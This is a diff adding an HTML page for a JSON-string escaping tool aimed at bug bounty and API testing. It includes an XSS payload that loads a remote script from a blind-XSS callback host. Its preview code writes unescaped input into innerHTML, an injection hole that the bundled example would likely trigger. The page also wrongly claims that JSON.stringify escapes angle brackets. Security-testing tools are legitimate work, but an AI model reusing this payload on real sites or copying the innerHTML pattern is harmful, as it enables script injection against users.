@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JSON Body Value Escaper - JSON.stringify() Based</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        .font-mono {
+            font-family: 'JetBrains Mono', monospace, Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+        }
+        
+        .bg-gradient-dark {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+        }
+        
+        .gradient-primary {
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+        }
+        
+        .gradient-success {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+        }
+        
+        .gradient-warning {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+        }
+        
+        .gradient-danger {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+        }
+        
+        .code-block {
+            background-color: rgba(15, 23, 42, 0.9);
+            border: 1px solid rgba(148, 163, 184, 0.2);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            overflow-x: auto;
+        }
+        
+        .char-highlight {
+            background-color: rgba(245, 158, 11, 0.2);
+            padding: 0 2px;
+            border-radius: 2px;
+        }
+        
+        .escape-highlight {
+            background-color: rgba(16, 185, 129, 0.2);
+            padding: 0 2px;
+            border-radius: 2px;
+        }
+        
+        .glow-effect {
+            box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .tooltip {
+            position: relative;
+        }
+        
+        .tooltip:hover::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(15, 23, 42, 0.95);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            font-size: 0.875rem;
+            white-space: nowrap;
+            z-index: 10;
+            border: 1px solid rgba(148, 163, 184, 0.3);
+            margin-bottom: 5px;
+        }
+        
+        .json-key {
+            color: #f472b6;
+        }
+        
+        .json-string {
+            color: #34d399;
+        }
+        
+        .json-number {
+            color: #60a5fa;
+        }
+        
+        .json-boolean {
+            color: #fbbf24;
+        }
+        
+        .json-null {
+            color: #9ca3af;
+        }
+    </style>
+</head>
+<body class="bg-gradient-dark text-gray-100 min-h-screen">
+    <div class="container mx-auto px-4 py-8 max-w-6xl">
+        <!-- Header -->
+        <header class="mb-10 text-center">
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">
+                <span class="text-transparent bg-clip-text gradient-primary inline-block">
+                    <i class="fas fa-shield-alt mr-3"></i>JSON Body Value Escaper
+                </span>
+            </h1>
+            <p class="text-xl text-gray-300 max-w-3xl mx-auto">
+                Escape nilai JSON dengan <code class="bg-gray-800 px-2 py-1 rounded font-mono">JSON.stringify()</code> 
+                untuk keamanan transport data. <span class="text-amber-300 font-semibold">Pure transform, no execution.</span>
+            </p>
+        </header>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-10">
+            <!-- Input Section -->
+            <div class="bg-slate-800/70 rounded-xl p-6 shadow-xl border border-slate-700">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-2xl font-bold text-slate-200">
+                        <i class="fas fa-keyboard mr-2 text-indigo-400"></i>Input JSON Value
+                    </h2>
+                    <div class="flex space-x-2">
+                        <button id="loadExample" class="px-4 py-2 gradient-warning text-white rounded-lg hover:opacity-90 transition text-sm font-medium">
+                            <i class="fas fa-code mr-1"></i> Load Example
+                        </button>
+                        <button id="clearInput" class="px-4 py-2 bg-slate-700 text-white rounded-lg hover:bg-slate-600 transition text-sm font-medium">
+                            <i class="fas fa-trash mr-1"></i> Clear
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="mb-4">
+                    <label class="block text-slate-300 mb-2 font-medium">
+                        Masukkan string yang perlu di-escape untuk JSON:
+                    </label>
+                    <textarea id="inputText" rows="10" class="w-full font-mono p-4 bg-slate-900 border border-slate-600 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent text-gray-100 text-sm" placeholder='Contoh: "><svg onload="alert(1)">'></textarea>
+                </div>
+                
+                <div class="flex justify-between text-sm text-slate-400 mb-6">
+                    <div>
+                        Characters: <span id="charCount" class="font-bold">0</span>
+                        | Lines: <span id="lineCount" class="font-bold">1</span>
+                    </div>
+                    <div id="inputStatus" class="text-amber-400">
+                        <i class="fas fa-exclamation-circle mr-1"></i> Ready for escaping
+                    </div>
+                </div>
+                
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    <button id="escapeBtn" class="gradient-primary text-white font-semibold py-3 px-6 rounded-lg hover:opacity-90 transition flex items-center justify-center">
+                        <i class="fas fa-magic mr-2"></i> Escape with JSON.stringify()
+                    </button>
+                    <button id="escapeFullBtn" class="bg-slate-700 text-white font-semibold py-3 px-6 rounded-lg hover:bg-slate-600 transition flex items-center justify-center">
+                        <i class="fas fa-layer-group mr-2"></i> Escape as Full JSON
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Output Section -->
+            <div class="bg-slate-800/70 rounded-xl p-6 shadow-xl border border-slate-700">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-2xl font-bold text-slate-200">
+                        <i class="fas fa-check-circle mr-2 text-emerald-400"></i>Escaped Output
+                    </h2>
+                    <div class="flex items-center">
+                        <span id="copyStatus" class="text-sm text-slate-400 mr-3 hidden">
+                            <i class="fas fa-check mr-1"></i> Copied!
+                        </span>
+                        <button id="copyBtn" class="px-4 py-2 gradient-success text-white rounded-lg hover:opacity-90 transition text-sm font-medium">
+                            <i class="fas fa-copy mr-1"></i> Copy to Clipboard
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="mb-4">
+                    <label class="block text-slate-300 mb-2 font-medium">
+                        Hasil escaping (aman untuk body JSON):
+                    </label>
+                    <div class="relative">
+                        <textarea id="outputText" rows="10" class="w-full font-mono p-4 bg-slate-900 border border-slate-600 rounded-lg text-gray-100 text-sm" readonly></textarea>
+                        <div id="outputPlaceholder" class="absolute inset-0 flex items-center justify-center text-slate-500 pointer-events-none">
+                            <div class="text-center">
+                                <i class="fas fa-arrow-left text-2xl mb-2"></i>
+                                <p>Escaped output akan muncul di sini</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="flex justify-between text-sm text-slate-400 mb-4">
+                    <div>
+                        Characters: <span id="outputCharCount" class="font-bold">0</span>
+                        | Escape count: <span id="escapeCount" class="font-bold">0</span>
+                    </div>
+                    <div id="outputStatus" class="text-slate-400">
+                        <i class="fas fa-info-circle mr-1"></i> Waiting for input
+                    </div>
+                </div>
+                
+                <!-- Tabs for different views -->
+                <div class="mb-4">
+                    <div class="flex border-b border-slate-700">
+                        <button data-tab="preview" class="tab-btn py-2 px-4 text-slate-300 hover:text-white font-medium border-b-2 border-transparent hover:border-indigo-400 transition">
+                            <i class="fas fa-eye mr-2"></i> Preview
+                        </button>
+                        <button data-tab="raw" class="tab-btn py-2 px-4 text-slate-300 hover:text-white font-medium border-b-2 border-transparent hover:border-indigo-400 transition">
+                            <i class="fas fa-code mr-2"></i> Raw JSON
+                        </button>
+                        <button data-tab="difference" class="tab-btn py-2 px-4 text-slate-300 hover:text-white font-medium border-b-2 border-transparent hover:border-indigo-400 transition">
+                            <i class="fas fa-exchange-alt mr-2"></i> Difference
+                        </button>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <!-- Preview Tab -->
+                        <div id="previewTab" class="tab-content active">
+                            <div class="code-block">
+                                <pre id="previewOutput" class="font-mono text-sm"></pre>
+                            </div>
+                        </div>
+                        
+                        <!-- Raw JSON Tab -->
+                        <div id="rawTab" class="tab-content">
+                            <div class="code-block">
+                                <pre id="rawOutput" class="font-mono text-sm"></pre>
+                            </div>
+                        </div>
+                        
+                        <!-- Difference Tab -->
+                        <div id="differenceTab" class="tab-content">
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <h4 class="font-medium text-slate-300 mb-2">Before:</h4>
+                                    <div class="code-block h-32 overflow-y-auto">
+                                        <pre id="beforeDiff" class="font-mono text-xs text-red-300"></pre>
+                                    </div>
+                                </div>
+                                <div>
+                                    <h4 class="font-medium text-slate-300 mb-2">After:</h4>
+                                    <div class="code-block h-32 overflow-y-auto">
+                                        <pre id="afterDiff" class="font-mono text-xs text-emerald-300"></pre>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mt-4 p-3 bg-slate-900/50 rounded-lg">
+                                <h4 class="font-medium text-slate-300 mb-2">
+                                    <i class="fas fa-info-circle text-blue-400 mr-2"></i>Escaped Characters:
+                                </h4>
+                                <div id="escapedCharsList" class="text-sm font-mono">
+                                    <!-- List of escaped characters will appear here -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Features & Examples Section -->
+        <div class="bg-slate-800/50 rounded-xl p-6 mb-8 border border-slate-700">
+            <h3 class="text-2xl font-bold text-slate-200 mb-6 text-center">
+                <i class="fas fa-cogs mr-2 text-indigo-400"></i>How It Works & Examples
+            </h3>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                <div class="bg-slate-900/70 p-5 rounded-lg border border-slate-700">
+                    <div class="text-amber-400 text-xl mb-3">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <h4 class="text-lg font-bold text-slate-200 mb-2">Problem: Invalid JSON</h4>
+                    <p class="text-slate-300 text-sm mb-3">String tanpa escaping membuat JSON invalid:</p>
+                    <div class="code-block text-xs">
+                        <span class="json-key">"data"</span>: <span class="json-string">"&lt;svg onload="alert(1)"&gt;"</span>
+                    </div>
+                    <p class="text-red-400 text-xs mt-2">
+                        <i class="fas fa-times-circle mr-1"></i> Invalid JSON - quotes inside string break parsing
+                    </p>
+                </div>
+                
+                <div class="bg-slate-900/70 p-5 rounded-lg border border-slate-700">
+                    <div class="text-emerald-400 text-xl mb-3">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h4 class="text-lg font-bold text-slate-200 mb-2">Solution: JSON Escaping</h4>
+                    <p class="text-slate-300 text-sm mb-3">JSON.stringify() escapes special characters:</p>
+                    <div class="code-block text-xs">
+                        <span class="json-key">"data"</span>: <span class="json-string">"&lt;svg onload=\"alert(1)\"&gt;"</span>
+                    </div>
+                    <p class="text-emerald-400 text-xs mt-2">
+                        <i class="fas fa-check-circle mr-1"></i> Valid JSON - quotes are escaped with backslash
+                    </p>
+                </div>
+                
+                <div class="bg-slate-900/70 p-5 rounded-lg border border-slate-700">
+                    <div class="text-blue-400 text-xl mb-3">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h4 class="text-lg font-bold text-slate-200 mb-2">Transport Safety</h4>
+                    <p class="text-slate-300 text-sm mb-3">Payload tetap utuh, aman untuk transport:</p>
+                    <div class="code-block text-xs">
+                        <span class="json-key">"payload"</span>: <span class="json-string">"\u003csvg onload=\"alert(1)\"\u003e"</span>
+                    </div>
+                    <p class="text-blue-400 text-xs mt-2">
+                        <i class="fas fa-exchange-alt mr-1"></i> Safe for API, logging, databases
+                    </p>
+                </div>
+            </div>
+            
+            <!-- Example Showcase -->
+            <div class="bg-slate-900/80 rounded-lg p-5 border border-slate-600">
+                <h4 class="text-xl font-bold text-slate-200 mb-4">
+                    <i class="fas fa-code mr-2 text-purple-400"></i>Live Example
+                </h4>
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                        <h5 class="font-medium text-slate-300 mb-2">Input (XSS Payload):</h5>
+                        <div class="code-block mb-3">
+                            <code class="font-mono text-sm text-amber-300">&lt;svg onload="var a=document.createElement('script');a.src='https://xss.report/c/l';document.body.appendChild(a)"&gt;</code>
+                        </div>
+                        <button id="loadXSSExample" class="px-4 py-2 bg-amber-900/30 text-amber-300 rounded-lg hover:bg-amber-900/50 transition text-sm font-medium">
+                            <i class="fas fa-bug mr-1"></i> Load XSS Example
+                        </button>
+                    </div>
+                    <div>
+                        <h5 class="font-medium text-slate-300 mb-2">Output (Escaped):</h5>
+                        <div class="code-block mb-3">
+                            <code id="xssExampleOutput" class="font-mono text-sm text-emerald-300"></code>
+                        </div>
+                        <p class="text-slate-400 text-sm">
+                            <i class="fas fa-info-circle mr-1"></i> Aman untuk dikirim dalam body JSON request
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Information Section -->
+        <div class="bg-slate-800/50 rounded-xl p-6 border border-slate-700">
+            <h3 class="text-2xl font-bold text-slate-200 mb-6">
+                <i class="fas fa-info-circle mr-2 text-blue-400"></i>Important Notes
+            </h3>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                    <h4 class="text-lg font-bold text-slate-200 mb-3">
+                        <i class="fas fa-check text-emerald-400 mr-2"></i>What This Tool DOES
+                    </h4>
+                    <ul class="text-slate-300 space-y-2">
+                        <li class="flex items-start">
+                            <i class="fas fa-check-circle text-emerald-400 mt-1 mr-2"></i>
+                            <span>Meng-escape karakter khusus untuk JSON dengan <code class="bg-slate-700 px-1 rounded">JSON.stringify()</code></span>
+                        </li>
+                        <li class="flex items-start">
+                            <i class="fas fa-check-circle text-emerald-400 mt-1 mr-2"></i>
+                            <span>Memastikan string valid untuk body JSON request</span>
+                        </li>
+                        <li class="flex items-start">
+                            <i class="fas fa-check-circle text-emerald-400 mt-1 mr-2"></i>
+                            <span>Payload tetap utuh (hanya di-escape)</span>
+                        </li>
+                        <li class="flex items-start">
+                            <i class="fas fa-check-circle text-emerald-400 mt-1 mr-2"></i>
+                            <span>Aman untuk transport data antar sistem</span>
+                        </li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="text-lg font-bold text-slate-200 mb-3">
+                        <i class="fas fa-times text-red-400 mr-2"></i>What This Tool Does NOT Do
+                    </h4>
+                    <ul class="text-slate-300 space-y-2">
+                        <li class="flex items-start">
+                            <i class="fas fa-times-circle text-red-400 mt-1 mr-2"></i>
+                            <span>Bukan sanitasi keamanan final</span>
+                        </li>
+                        <li class="flex items-start">
+                            <i class="fas fa-times-circle text-red-400 mt-1 mr-2"></i>
+                            <span>Bukan pencegah XSS sepenuhnya</span>
+                        </li>
+                        <li class="flex items-start">
+                            <i class="fas fa-times-circle text-red-400 mt-1 mr-2"></i>
+                            <span>Tidak menghapus atau memfilter payload berbahaya</span>
+                        </li>
+                        <li class="flex items-start">
+                            <i class="fas fa-times-circle text-red-400 mt-1 mr-2"></i>
+                            <span>Tidak mengamankan output jika digunakan tanpa encoding di sisi client</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="mt-8 p-4 bg-slate-900/50 rounded-lg border border-slate-600">
+                <h5 class="font-bold text-slate-200 mb-2">
+                    <i class="fas fa-lightbulb text-yellow-400 mr-2"></i>Simple Analogy
+                </h5>
+                <p class="text-slate-300">
+                    Bayangkan payload berbahaya seperti <span class="font-bold text-amber-300">pisau 🔪</span>. 
+                    Tool ini membungkus pisau dengan <span class="font-bold text-emerald-300">sarung</span> (escaping), 
+                    bukan menumpulkan pisaunya. Saat dibuka lagi, pisau tetap tajam.
+                </p>
+            </div>
+        </div>
+        
+        <footer class="mt-10 pt-6 border-t border-slate-700 text-center text-slate-400 text-sm">
+            <p>
+                <i class="fas fa-heart text-red-400 mr-1"></i> 
+                Dibuat untuk keamanan aplikasi web | 
+                Cocok untuk: <span class="text-amber-300">API testing</span>, 
+                <span class="text-amber-300">Bug bounty</span>, 
+                <span class="text-amber-300">Security research</span>
+            </p>
+            <p class="mt-2">
+                Menggunakan <code class="bg-slate-800 px-1 rounded">JSON.stringify()</code> untuk escaping yang benar sesuai standar JSON
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        // DOM Elements
+        const inputText = document.getElementById('inputText');
+        const outputText = document.getElementById('outputText');
+        const outputPlaceholder = document.getElementById('outputPlaceholder');
+        const escapeBtn = document.getElementById('escapeBtn');
+        const escapeFullBtn = document.getElementById('escapeFullBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const clearInput = document.getElementById('clearInput');
+        const loadExample = document.getElementById('loadExample');
+        const loadXSSExample = document.getElementById('loadXSSExample');
+        const charCount = document.getElementById('charCount');
+        const lineCount = document.getElementById('lineCount');
+        const outputCharCount = document.getElementById('outputCharCount');
+        const escapeCount = document.getElementById('escapeCount');
+        const inputStatus = document.getElementById('inputStatus');
+        const outputStatus = document.getElementById('outputStatus');
+        const copyStatus = document.getElementById('copyStatus');
+        const previewOutput = document.getElementById('previewOutput');
+        const rawOutput = document.getElementById('rawOutput');
+        const beforeDiff = document.getElementById('beforeDiff');
+        const afterDiff = document.getElementById('afterDiff');
+        const escapedCharsList = document.getElementById('escapedCharsList');
+        const xssExampleOutput = document.getElementById('xssExampleOutput');
+        const tabBtns = document.querySelectorAll('.tab-btn');
+        const tabContents = {
+            preview: document.getElementById('previewTab'),
+            raw: document.getElementById('rawTab'),
+            difference: document.getElementById('differenceTab')
+        };
+
+        // Initialize with XSS example
+        const xssExample = '"><svg onload="var a=document.createElement(\'script\');a.src=\'https://xss.report/c/l\';document.body.appendChild(a)">';
+        xssExampleOutput.textContent = escapeForJSON(xssExample);
+
+        // Escape function using JSON.stringify()
+        function escapeForJSON(str) {
+            // Use JSON.stringify to properly escape the string
+            // This adds quotes around the string and escapes all necessary characters
+            const escaped = JSON.stringify(str);
+            // Remove the surrounding quotes to get just the escaped content
+            return escaped.slice(1, -1);
+        }
+
+        // Escape function for full JSON object
+        function escapeAsFullJSON(str) {
+            return JSON.stringify({ value: str }, null, 2);
+        }
+
+        // Count escaped characters
+        function countEscapes(str) {
+            const escaped = escapeForJSON(str);
+            let count = 0;
+            
+            // Count backslashes that are used for escaping
+            for (let i = 0; i < escaped.length; i++) {
+                if (escaped[i] === '\\') {
+                    // Check if this is an escape sequence
+                    if (i + 1 < escaped.length) {
+                        const nextChar = escaped[i + 1];
+                        if (['"', '\\', '/', 'b', 'f', 'n', 'r', 't', 'u'].includes(nextChar)) {
+                            count++;
+                        }
+                    }
+                }
+            }
+            
+            return count;
+        }
+
+        // Get list of escaped characters
+        function getEscapedChars(str) {
+            const escaped = escapeForJSON(str);
+            const escapedChars = [];
+            
+            for (let i = 0; i < escaped.length; i++) {
+                if (escaped[i] === '\\' && i + 1 < escaped.length) {
+                    const nextChar = escaped[i + 1];
+                    let charName = '';
+                    
+                    switch(nextChar) {
+                        case '"': charName = 'Double Quote'; break;
+                        case '\\': charName = 'Backslash'; break;
+                        case '/': charName = 'Forward Slash'; break;
+                        case 'b': charName = 'Backspace'; break;
+                        case 'f': charName = 'Form Feed'; break;
+                        case 'n': charName = 'New Line'; break;
+                        case 'r': charName = 'Carriage Return'; break;
+                        case 't': charName = 'Tab'; break;
+                        default:
+                            if (nextChar === 'u' && i + 5 < escaped.length) {
+                                charName = `Unicode (\\u${escaped.substring(i+2, i+6)})`;
+                            }
+                    }
+                    
+                    if (charName) {
+                        escapedChars.push({
+                            original: str[i] || 'n/a',
+                            escaped: `\\${nextChar}`,
+                            name: charName
+                        });
+                    }
+                }
+            }
+            
+            return escapedChars;
+        }
+
+        // Update character counters
+        function updateCounters() {
+            const text = inputText.value;
+            charCount.textContent = text.length;
+            lineCount.textContent = text.split('\n').length;
+            
+            // Update input status
+            if (text.length === 0) {
+                inputStatus.innerHTML = '<i class="fas fa-exclamation-circle mr-1"></i> Ready for escaping';
+                inputStatus.className = 'text-amber-400';
+            } else if (text.includes('"') || text.includes('\\') || text.includes('\n') || text.includes('\t')) {
+                inputStatus.innerHTML = `<i class="fas fa-exclamation-triangle mr-1"></i> Contains ${countEscapes(text)} characters to escape`;
+                inputStatus.className = 'text-amber-400';
+            } else {
+                inputStatus.innerHTML = '<i class="fas fa-check-circle mr-1"></i> No special characters found';
+                inputStatus.className = 'text-emerald-400';
+            }
+        }
+
+        // Update output
+        function updateOutput(useFullJSON = false) {
+            const input = inputText.value;
+            
+            if (!input.trim()) {
+                outputText.value = '';
+                outputPlaceholder.classList.remove('hidden');
+                outputStatus.innerHTML = '<i class="fas fa-info-circle mr-1"></i> Waiting for input';
+                outputStatus.className = 'text-slate-400';
+                outputCharCount.textContent = '0';
+                escapeCount.textContent = '0';
+                return;
+            }
+            
+            outputPlaceholder.classList.add('hidden');
+            
+            let escaped;
+            if (useFullJSON) {
+                escaped = escapeAsFullJSON(input);
+            } else {
+                escaped = escapeForJSON(input);
+            }
+            
+            outputText.value = escaped;
+            
+            // Update output counters
+            outputCharCount.textContent = escaped.length;
+            const escapes = countEscapes(input);
+            escapeCount.textContent = escapes;
+            
+            // Update output status
+            if (escapes > 0) {
+                outputStatus.innerHTML = `<i class="fas fa-shield-alt mr-1"></i> ${escapes} character(s) escaped for JSON safety`;
+                outputStatus.className = 'text-emerald-400';
+            } else {
+                outputStatus.innerHTML = '<i class="fas fa-check-circle mr-1"></i> No escaping needed for JSON';
+                outputStatus.className = 'text-blue-400';
+            }
+            
+            // Update preview tabs
+            updatePreviewTabs(input, escaped, useFullJSON);
+        }
+
+        // Update preview tabs
+        function updatePreviewTabs(original, escaped, useFullJSON) {
+            // Preview tab - highlighted escape sequences
+            let preview = escaped;
+            preview = preview.replace(/\\"/g, '<span class="escape-highlight">\\"</span>');
+            preview = preview.replace(/\\\\/g, '<span class="escape-highlight">\\\\</span>');
+            preview = preview.replace(/\\n/g, '<span class="escape-highlight">\\n</span>');
+            preview = preview.replace(/\\t/g, '<span class="escape-highlight">\\t</span>');
+            preview = preview.replace(/\\u([0-9a-fA-F]{4})/g, '<span class="escape-highlight">\\u$1</span>');
+            
+            previewOutput.innerHTML = preview;
+            
+            // Raw JSON tab
+            if (useFullJSON) {
+                rawOutput.textContent = escaped;
+            } else {
+                rawOutput.textContent = JSON.stringify({ "escaped_value": escaped }, null, 2);
+            }
+            
+            // Syntax highlighting for raw JSON
+            highlightJSON(rawOutput);
+            
+            // Difference tab
+            beforeDiff.textContent = original;
+            afterDiff.textContent = escaped;
+            
+            // Escaped characters list
+            const escapedChars = getEscapedChars(original);
+            if (escapedChars.length > 0) {
+                let listHTML = '<div class="grid grid-cols-1 gap-2">';
+                escapedChars.forEach(char => {
+                    listHTML += `
+                        <div class="flex justify-between items-center p-2 bg-slate-800/50 rounded">
+                            <div>
+                                <span class="text-amber-300">${char.original === '\n' ? '\\n' : char.original === '\t' ? '\\t' : char.original}</span>
+                                <span class="text-slate-400 mx-2">→</span>
+                                <span class="text-emerald-300">${char.escaped}</span>
+                            </div>
+                            <span class="text-slate-400 text-xs">${char.name}</span>
+                        </div>
+                    `;
+                });
+                listHTML += '</div>';
+                escapedCharsList.innerHTML = listHTML;
+            } else {
+                escapedCharsList.innerHTML = '<p class="text-slate-400 text-center py-2">No special characters needed escaping</p>';
+            }
+        }
+
+        // Syntax highlighting for JSON
+        function highlightJSON(element) {
+            const text = element.textContent;
+            let highlighted = text;
+            
+            // Highlight keys
+            highlighted = highlighted.replace(/"([^"]+)":/g, '<span class="json-key">"$1"</span>:');
+            
+            // Highlight strings
+            highlighted = highlighted.replace(/:"([^"]*)"/g, ': <span class="json-string">"$1"</span>');
+            
+            // Highlight numbers
+            highlighted = highlighted.replace(/: (\d+)/g, ': <span class="json-number">$1</span>');
+            
+            // Highlight booleans and null
+            highlighted = highlighted.replace(/: (true|false)/g, ': <span class="json-boolean">$1</span>');
+            highlighted = highlighted.replace(/: null/g, ': <span class="json-null">null</span>');
+            
+            element.innerHTML = highlighted;
+        }
+
+        // Copy to clipboard
+        function copyToClipboard() {
+            if (!outputText.value) return;
+            
+            outputText.select();
+            outputText.setSelectionRange(0, 99999);
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    copyStatus.classList.remove('hidden');
+                    copyBtn.innerHTML = '<i class="fas fa-check mr-1"></i> Copied!';
+                    copyBtn.classList.remove('gradient-success');
+                    copyBtn.classList.add('bg-emerald-700');
+                    
+                    setTimeout(() => {
+                        copyStatus.classList.add('hidden');
+                        copyBtn.innerHTML = '<i class="fas fa-copy mr-1"></i> Copy to Clipboard';
+                        copyBtn.classList.remove('bg-emerald-700');
+                        copyBtn.classList.add('gradient-success');
+                    }, 2000);
+                }
+            } catch (err) {
+                console.error('Failed to copy: ', err);
+            }
+        }
+
+        // Tab switching
+        function switchTab(tabName) {
+            // Hide all tabs
+            Object.values(tabContents).forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected tab
+            if (tabContents[tabName]) {
+                tabContents[tabName].classList.add('active');
+            }
+            
+            // Update tab buttons
+            tabBtns.forEach(btn => {
+                if (btn.getAttribute('data-tab') === tabName) {
+                    btn.classList.add('border-indigo-400', 'text-white');
+                    btn.classList.remove('border-transparent');
+                } else {
+                    btn.classList.remove('border-indigo-400', 'text-white');
+                    btn.classList.add('border-transparent');
+                }
+            });
+        }
+
+        // Event Listeners
+        inputText.addEventListener('input', updateCounters);
+        
+        escapeBtn.addEventListener('click', () => {
+            updateOutput(false);
+            switchTab('preview');
+        });
+        
+        escapeFullBtn.addEventListener('click', () => {
+            updateOutput(true);
+            switchTab('raw');
+        });
+        
+        copyBtn.addEventListener('click', copyToClipboard);
+        
+        clearInput.addEventListener('click', () => {
+            inputText.value = '';
+            outputText.value = '';
+            outputPlaceholder.classList.remove('hidden');
+            updateCounters();
+            updateOutput();
+        });
+        
+        loadExample.addEventListener('click', () => {
+            inputText.value = 'This is a "test" with\nnewlines and\ttabs \\ backslashes';
+            updateCounters();
+            updateOutput(false);
+            switchTab('difference');
+        });
+        
+        loadXSSExample.addEventListener('click', () => {
+            inputText.value = xssExample;
+            updateCounters();
+            updateOutput(false);
+            switchTab('preview');
+        });
+
+        // Tab button events
+        tabBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const tabName = btn.getAttribute('data-tab');
+                switchTab(tabName);
+            });
+        });
+
+        // Initialize
+        updateCounters();
+        
+        // Initialize with a simple example
+        setTimeout(() => {
+            inputText.value = 'Simple "test" example';
+            updateCounters();
+            updateOutput(false);
+        }, 500);
+    </script>
+</body>
+</html>
